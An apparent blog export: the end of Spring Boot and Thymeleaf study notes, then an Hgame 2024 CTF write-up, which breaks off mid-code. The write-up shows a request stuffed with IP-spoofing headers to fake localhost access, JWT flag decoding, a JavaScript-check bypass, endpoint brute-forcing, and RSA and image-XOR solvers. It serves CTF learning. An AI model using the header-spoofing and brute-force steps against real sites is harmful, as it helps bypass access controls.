class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-validation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以修改默认报错语句</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b2818b2b3352ea8e17da6481d621dbf3.png" alt="image-20240718163715176"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6d93dd8f67678f88157c24156164a48b.png" alt="image-20240718163637171"></p><p>jsr303 校验语句</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0b6f89f7926336d44494a771c34bfe9c.png" alt="image-20240718163909131"></p><h3 id="0x06-多环境配置">0x06 多环境配置</h3><p>在配置application.properties时  有默认环境 测试环境 上线环境 但是逐个修改很麻烦 可以直接进行多环境配置</p><p><img src="https://img-blog.csdnimg.cn/img_convert/528d42ff449489f1aa8bdb8820e16c5c.png" alt="image-20240718173542268"></p><p>下面凸显yaml的多文档模式的便捷</p><p><img src="https://img-blog.csdnimg.cn/img_convert/76c9444be2aa036c8c4aacd49f138c3d.png" alt="image-20240718173802610"></p><p>分割线就是划分文件</p><h3 id="0x07-再探自动配置原理">0x07 再探自动配置原理</h3><p>学这个的目的 是让我们更会写内容 在思考中写配置 而不是看文档背</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d4d4ee1accbc687a46f007244c280955.png" alt="image-20240718180546610"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5e8fc7b290e4be82e6f861308ea5d86b.png" alt="image-20240718181340719"></p><p>遇到什么 看什么 配置就是在pom中加一个starter启动即可</p><h2 id="开发阶段">开发阶段</h2><h3 id="0x00-springboot-web开发">0x00 SpringBoot Web开发</h3><p>目录结构：</p><p>在resources中 static放静态资源    templates放模版</p><p><img src="https://img-blog.csdnimg.cn/img_convert/eb08d15e692c5490c95967c986b4ae0a.png" alt="image-20240718202358168"></p><p>导入静态资源</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a0f437b9dfc568417b6662a1100e8a83.png" alt="image-20240718204301920"></p><p>前提引入maven</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jquery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问成功拿下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/82faae6bce93797d2f7be258f0984e0e.png" alt="image-20240718204420465"></p><ul><li>探索哪些可以直接被访问到</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/7e06546be0c0961c2b73a8fc8ec64da8.png" alt="image-20240718205659267"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9a7df38c8dbc8744c44c1edb28526970.png" alt="image-20240718205750246"></p><p>成功访问public文件夹下的内容    注意： 优先级 按这个顺序  第一个就是在当前目录下  第二个指还可以创建一个resources文件夹</p><p><img src="https://img-blog.csdnimg.cn/img_convert/afcad6b9171e80482f8a1ca90e438ad2.png" alt="image-20240718205842027"></p><p>一般习惯：</p><ul><li>public：大家公共访问的资源</li><li>resources：upload大家上传的资源</li><li>static：index.html首页 + 静态资源 比如图片之类的</li><li>templates：所有该目录下的文件 只能通过Controller来</li></ul><blockquote><p>总结：</p><ol><li>在Springboot，我们可以使用以下方式处理静态资源<ul><li>webjars   localhost:8081/webjars/    这个方式不推荐</li><li>public static  /**  resources   localhost:8081/</li></ul></li><li>要学会读源码  因为技术在不断更新  不能全靠老师  上面的文件目录就来自于源码的读取</li></ol></blockquote><h4 id="首页和图标定制">首页和图标定制</h4><p>首页 index.html</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5fe28dd104a372ce4db4c91fc03801c0.png" alt="image-20240718212328379"></p><p>直接访问 非常完美</p><p><img src="https://img-blog.csdnimg.cn/img_convert/66e6f890a898725ba7e67bba1102f780.png" alt="image-20240718212425277"></p><h3 id="0x01-模版引擎">0x01 模版引擎</h3><ul><li>概念</li></ul><p>先解释一下这个东西的作用</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a1588ef84c60193e1c8a46abaae7c28e.png" alt="image-20240718234402052"></p><p>简单来说就是在<strong>前端界面</strong>预留位置 然后结合<strong>后端的数据</strong> 进行<strong>渲染</strong> 生成最终呈现给用户的界面</p><ul><li>常见引擎</li></ul><p>jsp</p><p>freemarker</p><p>Thymeleaf</p><ul><li>常用Thymeleaf使用</li></ul><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Thymelead  基于3.x开发--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf.extras<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-extras-java8time<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>默认放在templates目录下 后缀名是html</p><p><img src="https://img-blog.csdnimg.cn/img_convert/924e96cef5993ecfe6d348146c448888.png" alt="image-20240719083421574"></p><blockquote><p>结论：</p><p>只要需要使用thymeleaf 只需要导入对应的依赖就可以</p><p>我们将html放在templates目录下即可</p><p>使用方法如下：在Controller层引过去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外一定要掌握钻研  读源码的本领  要不然就会被直接公司招新人  你就被淘汰</p></blockquote><p>声明命名空间  在html文件中 添加后面这一句xm…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所有的html元素都可以被thymeleaf接管：  即th:元素名</p><p>小demo：</p><p>Controller层：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9db6ad27f9d287d6e374a6d22824d586.png" alt="image-20240719151742665"></p><p>html：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/628a901b9f0987e856e69ebbcd92ae61.png" alt="image-20240719151917167"></p><p>效果：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/616527efa6310288b48049f8f8a0a921.png" alt="image-20240719151934872"></p><h3 id="0x02-thymeleaf语法">0x02 Thymeleaf语法</h3><blockquote><p>取变量：${…}</p><p>取URL：@{…}</p></blockquote><p>文本转义：text</p><p>不转义：utext</p><p>demo：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8ea1b2af7a9d9f15fbf76c31e199f0bd.png" alt="image-20240719152341702"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9c2207ef9360ddbc399e094ebcc12b4d.png" alt="image-20240719152408370"></p><p>效果：<img src="https://img-blog.csdnimg.cn/img_convert/ee7228b372c2b7ef2ff1a3e1a062e0f7.png" alt="image-20240719152426796"></p><p>检查一下网页代码 可以发现尖括号被转义了  这也就提供了防范xss的思路</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8f84601f8e0a8d6eeb737b6e05cae2a8.png" alt="image-20240719152522895"></p><ul><li>遍历</li></ul><p>首先在Controller层中写个数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.addAttribute(<span class="string">&quot;users&quot;</span>, Arrays.asList(<span class="string">&quot;happySu&quot;</span>, <span class="string">&quot;is&quot;</span>, <span class="string">&quot;your dad&quot;</span>));</span><br></pre></td></tr></table></figure><p>然后再html中修改一下 提供两种赋值方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>111<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--方法一： $&#123;&#125;都是在取变量的值  这是循环遍历users变量 赋值给user  先遍历出来  然后后面text取值 取刚刚遍历出来的变量user的值进行输出--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">th:each</span>=<span class="string">&quot;user:$&#123;users&#125;&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--方法二： 行内输出  两个中括号包裹起来就行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">th:each</span>=<span class="string">&quot;user:$&#123;users&#125;&quot;</span>&gt;</span>[[ $&#123;user&#125; ]]<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://img-blog.csdnimg.cn/img_convert/54b66d0fbcc20a97926c491178331551.png" alt="image-20240719153357118"></p><h3 id="0x03-springmvc配置原理">0x03 SpringMVC配置原理</h3><p>@Configuration注解：表示是一个配置类</p><p>总结：在Springboot中，有非常多的xxxConfiguration帮助我们进行扩展配置 看到后要注意嗷</p><hr><p>学完基础的一点内容，后面展开一个项目的整体开发，期待吧~</p>]]></content>
      
      
      <categories>
          
          <category> ctf-web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hgame2024-WriteUp</title>
      <link href="/2024/02/06/2024-01-29-Hgame%20(copy)/"/>
      <url>/2024/02/06/2024-01-29-Hgame%20(copy)/</url>
      
        <content type="html"><![CDATA[<h1 id="hgame-2024">Hgame 2024</h1><h2 id="第一周">第一周</h2><p>解题情况：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205194242011.png" alt="image-20240205194242011"></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205194436160.png" alt="image-20240205194436160"></p><h3 id="web">Web</h3><h4 id="ezhttp">ezHTTP</h4><h5 id="考点：http请求头-jwt">考点：HTTP请求头 JWT</h5><h5 id="解题：">解题：</h5><p>首先是基础的HTTP请求头伪造</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 47.100.137.175:30761</span><br><span class="line">#1</span><br><span class="line">User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line">#2</span><br><span class="line">Referer: vidar.club</span><br><span class="line">#3</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line">True-Client-Ip:127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240130175814751.png" alt="image-20240130175814751"></p><p>然后得到最后的界面是flag已经给我了</p><p>我懵了一下 找了下没有</p><p>然后对比一下和上面的界面 发现多了一个Bearer</p><p>这里使用jwt解密</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240130175954184.png" alt="image-20240130175954184"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc</span><br></pre></td></tr></table></figure><h4 id="bypass-it">Bypass it</h4><h5 id="考点：javascrit禁用">考点：javascrit禁用</h5><h5 id="解题：">解题：</h5><p>无法登录</p><p>注册有弹窗拦截</p><p>根据题目提示到js enabled</p><p>所以先禁用注册 然后解禁</p><p>进行正常登录 直接拿到flag</p><p><code>hgame&#123;2ea3880a2c9973b41606b1cfe1dce682aebdf972&#125;</code></p><h4 id="2048">2048</h4><h5 id="考点：前段小游戏-f12">考点：前段小游戏 F12</h5><h5 id="解题：">解题：</h5><p>前端小游戏的思路就是去查看网页源码 看F12的代码</p><p>界面本身F12被禁用了 查看不了</p><p>解决方法就是在页面没有完全加载之前狂按F12卡进去</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205010643423.png" alt="image-20240205010643423"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">game-won<span class="string">&quot;:n(443),t=x?s0(n(439),&quot;</span>V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=<span class="title class_">QcTq6JkWK4</span>t3<span class="string">&quot;):n(453);this[n(438)][n(437)].add(e),this[n(438)][n(435)](&quot;</span>p<span class="string">&quot;)[-1257*-5+9*1094+-5377*3].textContent=t&#125;</span></span><br></pre></td></tr></table></figure><p>找到敏感信息<code>game-won</code> 游戏获胜的结果 对后面的内容丢进cyberchef看看</p><p>非常像base64的换表</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205012441443.png" alt="image-20240205012441443"></p><p>找到密文</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205012458634.png" alt="image-20240205012458634"></p><p><code>flag&#123;b99b820f-934d-44d4-93df-41361df7df2d&#125;</code></p><h4 id="选课">选课</h4><h5 id="考点：查接口-格式-爆破">考点：查接口 格式 爆破</h5><h5 id="解题：">解题：</h5><p>先对提交的时候抓包</p><p>在前端看到格式</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240202000632158.png" alt="image-20240202000632158"></p><p>多次暴力攻击 修改成功</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240202000529039.png" alt="image-20240202000529039"></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240202000552904.png" alt="image-20240202000552904"></p><p><code>hgame&#123;w0W_!_1E4Rn_To_u5e_5cripT_^_^&#125;</code></p><h3 id="reverse">Reverse</h3><h4 id="ezida">ezIDA</h4><h5 id="考点：ida使用">考点：IDA使用</h5><h5 id="解题：">解题：</h5><p>拖进IDAx64 在IDA View-A窗口 按空格快捷键转化 查到flag</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240131085358707.png" alt="image-20240131085358707"></p><h3 id="crypto">Crypto</h3><h4 id="ezrsa">ezRSA</h4><h5 id="考点：rsa-取模">考点：RSA 取模</h5><h5 id="解题：">解题：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"><span class="comment"># m=bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># p=getPrime(1024)</span></span><br><span class="line"><span class="comment"># q=getPrime(1024)</span></span><br><span class="line"><span class="comment"># n=p*q</span></span><br><span class="line"><span class="comment"># phi=(p-1)*(q-1)</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"><span class="comment"># c=pow(m,e,n)</span></span><br><span class="line"><span class="comment"># leak1=pow(p,q,n)</span></span><br><span class="line"><span class="comment"># leak2=pow(q,p,n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f&#x27;leak1=&#123;leak1&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;leak2=&#123;leak2&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;c=&#123;c&#125;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line">leak1=<span class="number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line">leak2=<span class="number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line">c=<span class="number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = leak2 * leak1</span><br><span class="line">phi = (leak1 - <span class="number">1</span>) * (leak2 - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><p>根据leak的生成方式 直接作为p和q解即可</p><h4 id="strangepicture">StrangePicture</h4><h5 id="考点：异或-图片加密">考点：异或 图片加密</h5><h5 id="解题：">解题：</h5><p>首先本地想测试一下 但是没有<code>PIL</code> 模块</p><p>直接下载发现找不到 是因为python3的缘故</p><p>目前PIL在pip下载的时候改名了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure><p>这样下载 使用PIL即可</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;hgame&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成指定宽度和高度的随机颜色图像 大概率是个标准化的东西 不重要 完全没有</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_image</span>(<span class="params">width, height</span>):</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):  <span class="comment">#遍历像素的每一列</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):  <span class="comment">#遍历像素的每一行</span></span><br><span class="line">            red = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            green = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            blue = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            <span class="comment">#给当前像素点赋颜色</span></span><br><span class="line">            pixels[x, y] = (red, green, blue)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment">#在给定图像上随机位置绘制一个文本标志 单纯的绘制 对于解密没帮助</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_text</span>(<span class="params">image, width, height, token</span>):</span><br><span class="line">    font_size = random.randint(<span class="number">16</span>, <span class="number">40</span>)  <span class="comment">#成一个介于 16 和 40 之间的随机字体大小。</span></span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, font_size)  <span class="comment">#加载字体文件 &quot;arial.ttf&quot; 并创建一个指定大小的字体对象。</span></span><br><span class="line">    text_color = (random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>))  <span class="comment">#生成一个随机的 RGB 值，作为文本的颜色。</span></span><br><span class="line">    <span class="comment">#在图像上的 (x, y) 坐标处绘制给定的文本标志 token，使用指定的字体、颜色进行填充。 同时x和y的操作 保证随机坐标一定在图像内部</span></span><br><span class="line">    x = random.randint(<span class="number">0</span>, width - font_size * <span class="built_in">len</span>(token))</span><br><span class="line">    y = random.randint(<span class="number">0</span>, height - font_size)</span><br><span class="line">    draw = ImageDraw.Draw(image)</span><br><span class="line">    draw.text((x, y), token, font=font, fill=text_color)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment">#对图像进行异或 感觉可逆</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)  <span class="comment">#创建一个新图像 存储异或后的结果</span></span><br><span class="line">    pixels1 = image1.load()  <span class="comment">#载入像素数据</span></span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):  <span class="comment">#遍历图像的每一列 </span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):  <span 